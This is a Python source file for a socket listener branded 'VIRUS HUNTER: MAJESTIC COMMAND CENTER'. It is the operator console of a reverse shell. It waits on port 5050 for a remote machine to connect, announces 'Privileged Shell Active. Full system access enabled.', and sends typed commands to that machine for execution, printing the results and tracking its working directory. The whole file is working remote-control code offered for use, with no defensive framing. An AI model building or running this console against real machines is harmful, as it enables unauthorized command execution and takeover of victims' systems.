import socket
import sys
import time
import re

def main():
    host = "0.0.0.0"
    port = 5050
    
    print("========================================")
    print(" VIRUS HUNTER: MAJESTIC COMMAND CENTER ")
    print("========================================")
    print(f"[*] Awaiting connection on {host}:{port}...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        return

    while True:
        try:
            conn, addr = server.accept()
            print(f"\n[+] SECURE LINK ESTABLISHED: {addr[0]}:{addr[1]}")
            print("[*] Privileged Shell Active. Full system access enabled.")
            print("[*] Controls: 'quit' to close, any other text to execute.")
            print("----------------------------------------")

            conn.settimeout(None)
            
            # Get initial greeting
            initial_data = conn.recv(1024).decode("utf-8")
            print(initial_data.strip())
            
            current_path = "v-hunter"
            path_match = re.search(r"Current Path: (.*)", initial_data)
            if path_match:
                current_path = path_match.group(1).strip()

            while True:
                # Custom prompt based on current path
                prompt_display = os.path.basename(current_path) if current_path != "v-hunter" else "system"
                cmd = input(f"operator@{prompt_display} $ ").strip()
                
                if not cmd:
                    try:
                        conn.send(b"ping\n")
                        conn.settimeout(2.0)
                        pong = conn.recv(1024)
                        conn.settimeout(None)
                        if not pong: break
                        continue
                    except:
                        print("[!] Connection lost.")
                        break
                
                try:
                    conn.send((cmd + "\n").encode("utf-8"))
                    if cmd.lower() == "quit":
                        break
                    
                    # Receive output
                    conn.settimeout(10.0)
                    response = conn.recv(16384).decode("utf-8")
                    
                    # Parse path info from output if present
                    path_tags = re.findall(r"\[PATH: (.*)\]", response)
                    if path_tags:
                        current_path = path_tags[-1].strip()
                        # Strip the path tag from the displayed output
                        response = re.sub(r"\[PATH: .*\]", "", response).strip()
                    
                    # Catch directory change notification specifically
                    dir_match = re.search(r"\[DIRECTORY CHANGED\] -> (.*)", response)
                    if dir_match:
                        current_path = dir_match.group(1).strip()

                    print(response)
                    conn.settimeout(None)
                    
                except socket.timeout:
                    print("[!] Command timeout: No response from system.")
                except Exception as e:
                    print(f"[!] Transmission error: {e}")
                    break
            
            conn.close()
            print("[*] Secure link terminated. Awaiting new connection...")
        except KeyboardInterrupt:
            break

    server.close()
    print("\n[*] Command Center shutdown.")

if __name__ == "__main__":
    import os # Needed for os.path.basename
    main()
